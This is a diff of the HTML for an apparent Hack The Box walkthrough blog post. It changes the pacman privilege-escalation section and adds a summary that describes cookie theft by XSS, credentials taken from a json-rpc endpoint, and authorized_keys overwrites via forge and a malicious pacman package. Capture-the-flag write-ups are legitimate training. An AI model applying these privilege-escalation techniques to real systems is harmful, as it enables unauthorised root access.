-    </figure>
-</p>
-<ul>
-<li>Got access as user <code>paul</code>
-
-    <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250107183526.png" />
-      
-    </figure>
-</li>
 <li>As we can see user <code>paul</code> has SUDO privilege to run <code>pacman</code></li>
-<li>To exploit this, create a own malicious package and install it using pacman.</li>
-<li>Initially I was struggling cause of my malicious package not working as intended.</li>
-<li>Then after that I have used a script from my group leader <a href="http://thecybersimon.com/posts/Privilege-Escalation-via-Pacman/" target="_blank">TheCyberSimon</a></li>
-<li>Then It worked for me</li>
+<li>To exploit this, we can create an own malicious package and install it using pacman.</li>
+<li>Initially I was struggling cause of my malicious package that I made is not working as intended.</li>
+<li>Then after that I used a script from my friend&rsquo;s blog <a href="http://thecybersimon.com/posts/Privilege-Escalation-via-Pacman/" target="_blank">TheCyberSimon</a>. Kindly support his blog too</li>
+<li>This time the package works</li>
 </ul>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span>
@@ -1330,31 +1440,77 @@
 </span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Don&#39;t forget to secure your private key: id_rsa
 </span></span></span></code></pre></div><ul>
 <li>This script is quite simple, the script first makes a directory named <code>priv</code> then creates a file named <code>PKGBUILD</code> with malicious code.</li>
-<li>The malicious code will replace the <code>root</code> user&rsquo;s <code>authorized_keys</code> file with our public key</li>
-<li>Script also creates the ssh keys of our system in the current directory with no password and then it renamed the public key name to <code>authorized_keys</code></li>
-<li>It executes this command <code>makepkg</code>. Which will compile the malicious  package with our public key <code>authorized_keys</code>
+<li>The malicious code will write the <code>root</code> user&rsquo;s <code>authorized_keys</code> file with our public key</li>
+<li>This script will also create ssh key for the current system in the current directory without any password and then it will replace the public key to <code>authorized_keys</code></li>
+<li>Then It will execute this command <code>makepkg</code>. Which will compile the malicious package and will also move the newly created key.
 
-    <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250107185332.png" />
-      
-    </figure>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250107185332.png?raw=true" alt="Pasted image 20250107185332.png" />
+    
+  </figure>
 </li>
-<li>Transfer this malicious package to the target system and install it using <code>sudo</code>
+<li>Transfer this malicious package to the target&rsquo;s system and install it using <code>sudo</code>
 
-    <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250107185451.png" />
-      
-    </figure>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250107185451.png?raw=true" alt="Pasted image 20250107185451.png" />
+    
+  </figure>
 </li>
 <li>On the host system give all the necessary permissions to our private key and use it to login</li>
-<li>System rooted successfully.
+<li>System have been 
+<div class="flex mt-2">
+<span
+  class="rounded-full bg-primary-500 dark:bg-primary-400 text-neutral-50 dark:text-neutral-800 px-1.5 py-[1px] text-xs font-normal"
+>
+  <span class="flex flex-row items-center">
+    
+    <span>Rooted successfully</span>
+  </span>
+</span>
+</div>
 
-    <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250107185638.png" />
-      
-    </figure>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250107185638.png?raw=true" alt="Pasted image 20250107185638.png" />
+    
+  </figure>
 </li>
 </ul>
+
+
+<h2 class="relative group">Summary 
+    <div id="summary" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#summary" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>First, the initial scan showed the usual suspects: SSH and a web server on port 80. Right away, the web app looked like a Web3 chat thing powered by Ethereum, which was a bit different. I made an account and poked around. The chat was there, and I noticed this &ldquo;Report User&rdquo; button that felt a bit off. Found an admin page too, but no luck getting in at that point.</p>
+<p>Next came the poking and prodding. That &ldquo;Report User&rdquo; button turned out to be a sweet spot for XSS. The admin on the other end seemed keen on clicking my crafted alerts. Used ChatGPT to whip up a payload to snag their cookie – and it worked like a charm, giving me access to the /admin page. Digging through the source there, I spotted a json-rpc endpoint. That got my attention, especially the eth_blockNumber function. I started messing with the block numbers and noticed I could pull data. One of those inputs looked like hex, so a quick decode with Cyberchef later, and boom, username and password.Time to get in. I took those credentials straight to SSH and landed a shell.Got the user flag, easy enough.</p>
+<p>Now for the real fun – getting root. I saw that user keira could run forge as sudo for paul. Did a bit of digging on forge and saw the flatten option could write files. So, I generated some SSH keys, dropped keira&rsquo;s public key in /tmp, and then used forge flatten to overwrite paul&rsquo;s authorized_keys with it. That gave me SSH access as paul using keira&rsquo;s private key. From there, I noticed paul could run pacman with sudo. I cooked up a simple script to create a malicious package that would replace root&rsquo;s authorized_keys with my own public key. After transferring it over and installing with sudo pacman, I logged in as root with my key and grabbed the root flag. Another one down.</p>
+<div id="typeit-72c6fb0e201854960f0d80404a96f860"></div>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+      new TypeIt("#typeit-72c6fb0e201854960f0d80404a96f860", {
+        strings: [" This box is full of new things as it featured block chain, I learnt a lot from this box and I expect the same for you. Don't forget to check my other posts, Until nextime ;) "],
+        speed:  100 ,
+        lifeLike:  false ,
+        startDelay:  0 ,
+        breakLines:  true ,
+        waitUntilVisible:  true ,
+        loop:  false 
+      }).go();
+    });
+</script>
+<p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://media.tenor.com/mTDKH-ocdH4AAAAi/%E3%81%BE%E3%81%9F%E3%81%AD-%E3%81%BE%E3%81%9F%E4%BC%9A%E3%81%8A%E3%81%86.gif" alt="bye" />
+    
+  </figure>
+</p>
 
           
           
@@ -1677,6 +1833,172 @@
   
   
 
+  <a href="/posts/1742495331851-travel-walkthroughhtb/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
+        
+        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/1742495331851-travel-walkthroughhtb/featured_hu_15d6c7a2ff79ffa6.jpeg);"></div>
+        
+      
+
+      <div class="px-6 py-4">
+
+        
+        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/posts/1742495331851-travel-walkthroughhtb/">Travel Walkthrough(Hack The Box)</div>
+        
+
+        <div class="text-sm text-neutral-500 dark:text-neutral-400">
+          
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2025-03-28T00:00:00&#43;00:00">28 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span>3416 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">17 mins</span>
+  
+
+  
+  
+</div>
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+</div>
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/hard/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Hard
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/linux/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Linux
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/hack-the-box/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Hack the Box
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/hacking/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Hacking
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/web/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Web
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/walkthrough/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Walkthrough
+  </span>
+</span>
+  </span>
+  
+  
+  
+  
+</div>
+
+
+
+
+        </div>
+
+        
+        <div class="py-1 prose dark:prose-invert">
+          
+        </div>
+        
+      </div>
+      <div class="px-6 pt-4 pb-2">
+
+      </div>
+    </div>
+  </a>
+
+  
+  
+
   <a href="/posts/1741762551259-caption-walkthroughhtb/" class="min-w-full">
     
     <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
@@ -1841,172 +2163,6 @@
   </a>
 
   
-  
-
-  <a href="/posts/1741809498520-union-walkthroughhtb/" class="min-w-full">
-    
-    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
-        
-        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/1741809498520-union-walkthroughhtb/featured_hu_3ed7bc6f71332e39.jpeg);"></div>
-        
-      
-
-      <div class="px-6 py-4">
-
-        
-        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
-          href="/posts/1741809498520-union-walkthroughhtb/">Union Walkthrough(Hack The Box)</div>
-        
-
-        <div class="text-sm text-neutral-500 dark:text-neutral-400">
-          
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-<div class="flex flex-row flex-wrap items-center">
-  
-  
-  <time datetime="2025-03-16T00:00:00&#43;00:00">16 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span>934 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">5 mins</span>
-  
-
-  
-  
-</div>
-
-
-<div class="flex flex-row flex-wrap items-center">
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-</div>
-
-
-
-
-<div class="flex flex-row flex-wrap items-center">
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/medium/&#34;,'_self');return false;">
-    <span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Medium
-  </span>
-</span>
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/linux/&#34;,'_self');return false;">
-    <span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Linux
-  </span>
-</span>
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/hack-the-box/&#34;,'_self');return false;">
-    <span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Hack the Box
-  </span>
-</span>
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/hacking/&#34;,'_self');return false;">
-    <span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Hacking
-  </span>
-</span>
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/web/&#34;,'_self');return false;">
-    <span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Web
-  </span>
-</span>
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/walkthrough/&#34;,'_self');return false;">
-    <span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Walkthrough
-  </span>
-</span>
-  </span>
-  
-  
-  
-  
-</div>
-
-
-
-
-        </div>
-
-        
-        <div class="py-1 prose dark:prose-invert">
-          
-        </div>
-        
-      </div>
-      <div class="px-6 pt-4 pb-2">
-
-      </div>
-    </div>
-  </a>
-
-  
 </section>
 
   
@@ -2041,7 +2197,7 @@
       <div class="flex justify-between pt-3">
         <span>
           
-            <a class="flex group mr-3" href="/posts/1742404292339-greenhorn-walkthroughhtb/">
+            <a class="flex group mr-3" href="/posts/1742495331851-travel-walkthroughhtb/">
               <span
                 class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                 >&larr;</span
@@ -2053,11 +2209,11 @@
               <span class="flex flex-col">
                 <span
                   class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >Greenhorn Walkthrough(Hack The Box)</span
+                  >Travel Walkthrough(Hack The Box)</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
-                    <time datetime="2025-03-26T00:00:00&#43;00:00">26 March 2025</time>
+                    <time datetime="2025-03-28T00:00:00&#43;00:00">28 March 2025</time>
                   
                 </span>
               </span>
